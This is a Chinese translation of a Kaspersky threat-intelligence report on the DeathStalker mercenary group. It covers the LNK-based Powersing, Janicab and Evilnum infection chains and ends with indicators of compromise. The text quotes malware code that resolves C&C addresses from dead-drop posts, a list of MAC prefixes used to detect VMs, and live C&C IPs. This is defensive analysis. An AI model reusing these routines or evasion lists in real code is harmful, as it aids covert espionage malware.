**译者：知道创宇404实验室翻译组**  
**原文链接：[https://securelist.com/](https://securelist.com/deathstalker-mercenary-triumvirate/98177/ "https://securelist.com/")**

国家赞助的威胁者和复杂的攻击经常成为人们关注的焦点。确实，他们的创新技术，先进的恶意软件平台和
0day漏洞利用链吸引了我们的想象力。但是，在大多数公司中，这些群体仍然不太可能成为风险模型的一部分，也不应该成为风险模型的一部分。当今的企业面临着更多直接的威胁，从勒索软件和客户信息泄漏到从事不道德商业行为的竞争对手。在文章中，我们将重点关注DeathStalker：这是一个独特的威胁组，似乎针对律师事务所和金融部门的公司（尽管我们偶尔在其他垂直行业也看到过）。据我们所知，他们不受经济利益的驱使。他们不部署勒索软件，不窃取付款信息并转售，或从事与网络犯罪黑社会相关的任何类型的活动。他们对收集敏感的业务信息感兴趣，这使我们相信DeathStalker是一群雇佣兵，他们提供黑客出租服务，或在金融界充当某种信息经纪人的角色。

DeathStalker首先通过[Powersing](https://sec0wn.blogspot.com/2018/12/powersing-from-lnk-files-to-janicab.html)的基于PowerShell的植入程序引起了我们的注意。通过分解该线程，我们可以确定可追溯到2018年甚至2012年的活动。但是，在深入探究DeathStalker的历史之前，我们将从一些背景开始，以下先介绍威胁者的武器库。

## Powersing工具链

### 总览

威胁行动者的最新操作依赖于相同的入侵媒介：带有包含恶意LNK文件的附加存档的鱼叉式网络钓鱼电子邮件。

[![img](https://images.seebug.org/content/images/2020/08/25/1598342017000-sl_decepticons_deathstalker_01.png-w331s)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/08/21145040/sl_decepticons_deathstalker_01.png)

尽管看起来像来自Explorer或流行的归档提取产品的文档，但是这些快捷方式仍指向cmd.exe。这些快捷方式文件具有以下结构：

[![img](https://images.seebug.org/content/images/2020/08/25/1598342025000-sl_decepticons_deathstalker_02.png-w331s)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/08/21145115/sl_decepticons_deathstalker_02.png)

单击它们将启动一个复杂的序列，导致在受害者的计算机上执行任意代码。通过cmd.exe的参数传递的简短PowerShell脚本引导了以下链：

[![img](https://images.seebug.org/content/images/2020/08/25/1598342025000-sl_decepticons_deathstalker_03.png-w331s)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/08/21145157/sl_decepticons_deathstalker_03.png)

  * 阶段0的作用是提取并执行链中的下一个元素，以及嵌入到LNK文件中以显示给用户的诱饵文档。这会产生单击真实文档的错觉，并确保受害者不会变得可疑。
  * 第1阶段是一个PowerShell脚本，其中包含C＃程序集，该程序集旨在连接到Dead Drop解析器（在下一段中对此有更多介绍），并通过从快捷方式中提取“ DLL”文件来获取用于解码链的最后阶段的加密材料。以固定的偏移量定位Base64编码的URL列表。通过在Windows启动文件夹中创建指向VBE启动脚本的快捷方式（使用拖放的图标），可以建立持久性。
  * 最后，在第2阶段，实际的恶意软件植入程序用于控制受害者的机器。它连接到一个死点解析器之一，以获取真实C＆C服务器的地址，并进入一个循环，每隔几秒钟查找一次订单。
  * 系统重新启动后，将自动执行VBE启动脚本（与阶段0极为相似），再次引导至Powersing阶段2。

与C＆C服务器的通信涉及JSON编码对象的交换。Powersing只有两个任务：

  * 捕获受害者机器上的定期屏幕截图，并立即发送到C＆C服务器（两个内置命令允许更改屏幕截图的质量和周期性）
  * 执行C＆C提供的任意Powershell脚本

在第1阶段和第2阶段，在我们分析过的不同样本中，安全软件规避行为的变化很大。根据在计算机上检测到的AV，Powersing可能会选择其他持久性方法，甚至完全停止运行。我们怀疑此工具集背后的小组在每个活动之前都进行了检测测试，并根据结果更新了脚本。这表明了软件设计的一种迭代且快节奏的方法。值得指出的是，阶段2会在计算机上主动查找虚拟化痕迹（例如，特定于供应商的MAC地址）和恶意软件分析工具，并将此信息报告给C＆C服务器。

总结本节，我们想提到Powersing不是一个整体的恶意软件平台。相反，它是受害者网络内部的隐性立足点，其关键作用是能够投射出更多工具。

### 死角解析器

DeathStalkers工具链利用大量公共服务作为死点解析器。这些服务为攻击者提供了一种通过公开帖子，评论，用户个人资料，内容描述等将数据存储在固定URL上的方式。攻击者留下的消息遵循以下模式：“我的键盘不起作用…[字符串]。
” 和“嘿兄弟我唱[64编码的字符串]，是的”。

[![img](https://images.seebug.org/content/images/2020/08/25/1598342025000-sl_decepticons_deathstalker_04.png-w331s)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/08/21145258/sl_decepticons_deathstalker_04.png)

在调查该威胁因素的过程中，我们发现了以下消息：

  * Google+
  * Imgur
  * Reddit
  * ShockChan
  * Tumblr
  * 推特
  * YouTube
  * WordPress

该列表很可能并不详尽。通过简单的Google查询可以发现许多此类消息。Powersing的首要业务是连接到它知道的任何死点解析器以检索此信息。阶段1使用这些消息的第一个字符串，其中包含用于解码阶段2的AES密钥。然后，阶段2连接到死点解析器，以获取在第二个字符串中编码的整数。如下代码摘录所示，该整数在被转换为IP地址之前，会被任意常数（随样本而变化）除以：

    
    
    public string LongToIP(string long_ip_string)  
    {
      long longIP;
      long.TryParse(long_ip_string, out longIP);
      longIP = longIP / 25835;  // NB: divide integer by an arbitrary constant
      string ip = string.Empty;
      for (int i = 0; i < 4; i++)
      {
        int num = (int)(longIP / Math.Pow(256, (3 - i)));
        longIP = longIP - (long)(num * Math.Pow(256, (3 - i)));
        if (i == 0)
          ip = num.ToString();
        else
          ip = ip + "." + num.ToString();
      }
      return ip;
    } 

该IP地址然后存储在用户的硬盘驱动器上，并用于建立与实际C＆C服务器的连接，操作员使用该IP地址来控制Powersing。依靠知名的公共服务，网络犯罪分子可以将最初的后门通信混入合法的网络流量中。这也限制了安全工作者可以采取哪些行动来阻碍其运作，因为这些平台通常无法在公司级别上被列入黑名单，而从中删除内容可能是一个艰巨而漫长的过程。但是，这是有代价的：互联网永远不会忘记，网络罪犯也很难清除其运行痕迹。借助搜索引擎索引或存档的数据，我们估计Powersing于2017年8月左右首次使用。

我们要提及的最后一个细节是，我们发现的许多Powersing C＆C具有SSL证书，让人联想到索菲斯臭名昭著的[筷子C＆C“
IT部门”](https://threatconnect.com/blog/using-fancy-bear-ssl-certificate-information-to-identify-their-infrastructure/)证书。我们相信此基础架构与索非西（Sofacy）没有关联，并且相信这是威胁行为者试图使防御者得出错误结论的尝试。

## DeathStalker链接到已知团体

### 亚尼察卜

Sec0wn在原始博客中介绍Powersing暗示了与名为Janicab的恶意软件家族的可能链接，该家族的较早样本可追溯到2012年。但是，据我们所知，这种连接从未公开进行过探索。最终，我们在Janicab
[的2015年博客文章](https://archive.f-secure.com/weblog/archives/00002803.html)（1fe4c500c9f0f7630a6037e2de6580e9）中获得了F-Secure列出的恶意软件样本之一，以寻找相似之处。

该文件是指向cmd.exe的另一个LNK，它在单击时会在系统上删除VBE脚本以及诱饵文档。该脚本和未列出的YouTube视频建立连接，以获得嵌入在说明中的C＆C信息：

[![img](https://images.seebug.org/content/images/2020/08/25/1598342025000-sl_decepticons_deathstalker_05.png-w331s)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/08/21145731/sl_decepticons_deathstalker_05.png)

然后，将在此页面上获得的整数除以常量，然后再转换为IP地址：

    
    
    Set objRE = New RegExp
    With objRE
        .Pattern = "our (.*)th psy anniversary"
        .IgnoreCase = True
    End With
    Set objMatch = objRE.Execute( outputHTML )
    
    If objMatch.Count = 1 Then
        server = ""
        server = objMatch.Item(0).Submatches(0)
        server = server / 31337  'NB: divide integer by an arbitrary constant
        'msgbox(server)
        server = IPConvert(server)
        server = "http://" & server & "/wp-admin-content"
    End If

虽然仅将YouTube用作死点解析器并不足以在两组之间建立链接，但我们认为，在线获取某个整数并将其分割后再将其解释为IP地址之前，该过程十分独特。

Janicab的功能也让我们想起了Powersing的功能：该示例包含基于计算机MAC地址的VM检测，寻找恶意软件分析程序以及熟悉的防病毒软件规避例程。Janicab还定期将受害者桌面的屏幕截图发送给C＆C，并似乎可以执行任意Python脚本。

Janicab的最新版本（85ed6ab8f60087e80ab3ff87c15b1174）使人想起网络流量的Powersing，尤其是当恶意软件向其C＆C服务器注册时：

为注册请求Powersing（POST数据） | Janicab注册请求  
---|---  
`{“un”: “[username]”,“cn”: “[computer name]”,“av”: “[installed AV
program]”,“dob”: “[OS installation date]”,“os”: “[OS version]”,“ou”:
“[campaign identifier]”,“dc”: “[version]”}` | `GET
/gid.php?action=add&cn=[computer name]&un=[username]&v=[version]&av=[installed
AV program]&an=[campaign identifier]`  
  
此外，此样本包含的黑名单VM MAC地址列表与本文前面介绍的Powersing样本完全相同，顺序相同。

Powersing列入黑名单的MAC地址 | Janicab的黑名单MAC地址  
---|---  
virtual_mac_prefix.Add（“ 00015D”）; | macs（ **0** ）=“ 00-01-5D”  
virtual_mac_prefix.Add（“ 0003BA”）; | macs（ **1** ）=“ 00-03-BA”  
virtual_mac_prefix.Add（“ 000782”）; | macs（ **2** ）=“ 00-07-82”  
virtual_mac_prefix.Add（“ 000F4B”）; | macs（ **3** ）=“ 00-0F-4B”  
virtual_mac_prefix.Add（“ 00104F”）; | macs（ **4** ）=“ 00-10-4F”  
virtual_mac_prefix.Add（“ 0010E0”）; | macs（ **5** ）=“ 00-10-E0”  
virtual_mac_prefix.Add（“ 00144F”）; | macs（ **6** ）=“ 00-14-4F”  
virtual_mac_prefix.Add（“ 0020F2”）; | macs（ **7** ）=“ 00-20-F2”  
virtual_mac_prefix.Add（“ 002128”）; | macs（ **8** ）=“ 00-21-28”  
virtual_mac_prefix.Add（“ 0021F6”）; | macs（ **9** ）=“ 00-21-F6”  
virtual_mac_prefix.Add（“ 005056”）; | macs（ **10** ）=“ 00-50-56”  
virtual_mac_prefix.Add（“ 000C29”）; | macs（ **11** ）=“ 00-0C-29”  
virtual_mac_prefix.Add（“ 000569”）; | macs（ **12** ）=“ 00-05-69”  
virtual_mac_prefix.Add（“ 0003FF”）; | macs（ **13** ）=“ 00-03-FF”  
virtual_mac_prefix.Add（“ 001C42”）; | macs（ **14** ）=“ 00-1C-42”  
virtual_mac_prefix.Add（“ 00163E”）; | macs（ **15** ）=“ 00-16-3E”  
virtual_mac_prefix.Add（“ 080027”）; | macs（ **16** ）=“ 08-00-27”  
virtual_mac_prefix.Add（“ 001C14”）; | macs（ **17** ）=“ 00-1C-14”  
virtual_mac_prefix.Add（“ 080020”）; | macs（ **18** ）=“ 08-00-20”  
virtual_mac_prefix.Add（“ 000D3A”）; | macs（ **19** ）=“ 00-0D-3A”  
virtual_mac_prefix.Add（“ 00125A”）; | macs（ **20** ）=“ 00-12-5A”  
virtual_mac_prefix.Add（“ 00155D”）; | macs（ **21** ）=“ 00-15-5D”  
virtual_mac_prefix.Add（“ 0017FA”）; | macs（ **22** ）=“ 00-17-FA”  
virtual_mac_prefix.Add（“ 001DD8”）; | macs（ **23** ）=“ 00-1D-D8”  
virtual_mac_prefix.Add（“ 002248”）; | macs（ **24** ）=“ 00-22-48”  
virtual_mac_prefix.Add（“ 0025AE”）; | macs（ **25** ）=“ 00-25-AE”  
virtual_mac_prefix.Add（“ 0050C2”）; | macs（ **26** ）=“ 00-50-C2”  
virtual_mac_prefix.Add（“ 0050F2”）; | macs（ **27** ）=“ 00-50-F2”  
virtual_mac_prefix.Add（“ 444553”）; | macs（ **28** ）=“ 44-45-53”  
virtual_mac_prefix.Add（“ 7CED8D”）; | macs（ **29** ）=“ 7C-ED-8D”  
  
### 恶魔 Evilnum

另一个值得研究的可能关系与最近的Evilnum恶意软件家族有关，该家族是ESET去年7月[发表](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)的深入[博客文章](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)的主题，以及我们自己的一些私人报告。ESET的帖子详细介绍了另一个基于LNK的感染链，该链导致了基于Javascript的恶意软件的执行。再次，我们获得了一个旧的Evilnum示例（219dedb53da6b1dce0d6c071af59b45c），并观察到它还从死点解析器（GitHub）获取了C＆C信息，从而获得了使用以下代码转换的IP地址：

    
    
    function extract_srvaddr() {
      serverFound = false;
      pattern = 'our news start at (.*) thank you';
      while(serverFound == false) {
        var item = items[Math.floor(Math.random()*items.length)];
        var html = get_page_content_with_ie(item,'');
        if(html != '') {
          var match = extract_string(pattern, html);
          if(match != null) {
          srv = num2dot(match[1]/666); // NB: divide integer by a constant
          srv = srv + "/Validate";
          srv_stat = get_page_content_with_ie(srv+"/ValSrv", '');
          validate_str = extract_string('youwillnotfindthisanywhare', srv_stat);
          if(validate_str == 'youwillnotfindthisanywhare') {
            serverFound = true;
            return srv;
          }
        }
      }
    }

我们不禁注意到使用正则表达式来查找特定字符串以获取整数，然后将该整数除以常量得到C＆C服务器IP地址的模式。尽管Evilnum提供了比Powersing更多的功能，但它也可以捕获屏幕截图并将其发送到C＆C服务器。

在受害者方面，Evilnum专注于金融科技领域的公司。它似乎对商业智能比对财务收益更感兴趣。这与到目前为止我们观察到的DeathStalker活动一致。

我们要提到的最后一个联系是，尽管以不同的语言编写，但最近的Evilnum（835d94b0490831da27d9bf4e9f4b429c）和Janicab示例有一些轻微的代码重叠：

  * 在执行等效任务的函数中使用具有相似名称的变量（对于Janicab是“ ieWatchdogFilename”，对于Evilnum是“ ieWatchdogPath”）
  * 用于清除的两个函数具有相同的名称：“ deleteLeftOvers”

我们认为这些名称足够独特，可以在两个恶意软件家族之间创建一个附加链接。不太确定的是，此Evilnum示例还包含一个名为“
long2ip”的函数，用于将整数转换为IP地址，而Powersing包含一个以“ LongToIP”命名的类似实现。

### 摘要

Powersing，Janicab和Evilnum是三个基于脚本语言的工具链，它们具有以下相似之处：

  * 所有这三个都是通过鱼叉式网络钓鱼提供的存档中包含的LNK文件分发的
  * 他们使用正则表达式和硬编码语句从死点解析器获取C＆C信息
  * IP地址以整数形式获得，然后在转换之前将其除以硬编码常量
  * 三个恶意软件系列之间的代码重叠很少，可能表明它们是由同一团队或在共享软件开发实践的小组内部开发的
  * 这三个恶意软件家族均具有截图捕获功能。尽管本身并不是原创，但这通常不是此类小组开发优先级的一部分，并且可能表示共享的设计规范
  * 最后，尽管我们没有太多有关Janicab受害者的信息，但Powersing和Evilnum都在追求商业智能，尽管它们来自不同的行业领域。两组活动均与雇佣军进行的假设相符

尽管这些观点本身不足以得出结论，但我们认为它们一起使我们能够中等信心地评估 **Powersing，Evilnum和Janicab是由同一集团运营**
。我们目前无法透露的行业合作伙伴与我们共享的其他数据也支持这一结论。

## 攻击对象

DeathStalker主要针对金融部门的私人实体，包括律师事务所，财富咨询公司，金融技术公司等。在一个独特的实例中，我们还观察到DeathStalker攻击一个外交实体。

[![img](https://images.seebug.org/content/images/2020/08/25/1598342025000-20200821_Map_Powersing_Evilnum.png-w331s)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/08/24092316/20200821_Map_Powersing_Evilnum.png)

我们已经能够确定在阿根廷，中国，塞浦路斯，以色列，黎巴嫩，瑞士，台湾，土耳其，英国和阿拉伯联合酋长国与Powersing相关的活动。我们还在塞浦路斯，印度，黎巴嫩，俄罗斯和阿拉伯联合酋长国安置了Evilnum受害者。

但是，我们认为DeathStalkers纯粹是根据他们的感知价值或可能根据客户要求来选择目标。在这种情况下，我们评估了金融部门中的任何公司，无论其地理位置如何，都能引起DeathStalker的注意。

## 结论

在此博客文章中，我们介绍了新式感染链，该链如今仍被威胁者积极使用和开发者。它不包含任何创新技巧或复杂方法，并且链中的某些组件实际上可能看起来并不必要。但是，如果有关同一个集团运营Janicab和Powersing的假设是正确的，则表明他们自2012年以来就一直在利用相同的方法。在信息安全领域，没有比这更“真实”的了。

基于这些工具链显示的有限的技术手段，我们认为它们是小型组甚至熟练的个人可以创造的典范。我们在公开发布有关DeathStalker的信息时看到的价值在于，使这一威胁参与者成为私营部门能防御的基线。像DeathStalker这样的组织代表着当今大多数公司面临的网络威胁类型，而不仅仅是国家资助的APT。由于其正在进行的运营（DeathStalker自2020年3月以来特别利用Janabb和Powersing植入物利用COVID-19进行部署）以及自2018年以来的持续活动，我们相信DeathStalker仍在开发其工具集，并且我们将不久的将来有更多报告。

我们建议防御者密切注意与脚本语言（例如powershell.exe和cscript.exe）的Windows解释器有关的任何过程创建。这些实用程序应尽可能不用。我们还建议未来的意识培训和安全产品评估包括基于LNK文件的感染链。

## IOC

|  
---|---  
D330F1945A39CEB78B716C21B6BE5D82 | Malicious LNK  
D83F933B2A6C307E17438749EDA29F02 | Malicious LNK  
540BC05130424301A8F0543E0240DF1D | Malicious LNK  
3B359A0E279C4E8C5B781E0518320B46 | Malicious LNK  
6F965640BC609F9C5B7FEA181A2A83CA | Malicious LNK  
E1718289718792651FA401C945C17079 | Malicious LNK  
F558E216CD3FB6C23696240A8C6306AC | Malicious LNK  
B38D1C18CBCCDDDBF56FDD28E5E6ECBB | Loader Script  
E132C596857892AC41249B90EA6934C1 | PowerSing Stage 1  
9A0F56CDACCE40D7039923551EAB241B | PowerSing Stage 1  
0CEBEB05362C0A5665E7320431CD115A | PowerSing Stage 1  
C5416D454C4A2926CA6128E895224981 | PowerSing Stage 1  
DBD966532772DC518D818A3AB6830DA9 | PowerSing Stage 1  
B7BBA5E70DC7362AA00910443FB6CD58 | PowerSing Stage 1  
2BE3E8024D5DD4EB9F7ED45E4393992D | PowerSing Stage 1  
83D5A68BE66A66A5AB27E309D6D6ECD1 | PowerSing Stage 1  
50D763EFC1BE165B7DB3AB5D00FFACD8 | PowerSing Stage 1  
**C &C servers** |  
---|---  
54.38.192.174
[（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=54.38.192.174
"（ZoomEye搜索结果）") | Powersing C&C  
91.229.76.17
[（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=91.229.76.17
"（ZoomEye搜索结果）") | Powersing C&C  
91.229.76.153 [（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=
91.229.76.153 "（ZoomEye搜索结果）") | Powersing C&C  
91.229.77.240 [（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=
91.229.77.240 "（ZoomEye搜索结果）") | Powersing C&C  
91.229.77.120 [（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=
91.229.77.120 "（ZoomEye搜索结果）") | Powersing C&C  
91.229.79.120 [（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=
91.229.79.120 "（ZoomEye搜索结果）") | Powersing C&C  
54.38.192.174 [（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=
54.38.192.174 "（ZoomEye搜索结果）") | Powersing C&C  
105.104.10.115 [（ZoomEye搜索结果）](https://www.zoomeye.org/searchResult?q=
105.104.10.115 "（ZoomEye搜索结果）") | Powersing C&C  
  
* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1312/>

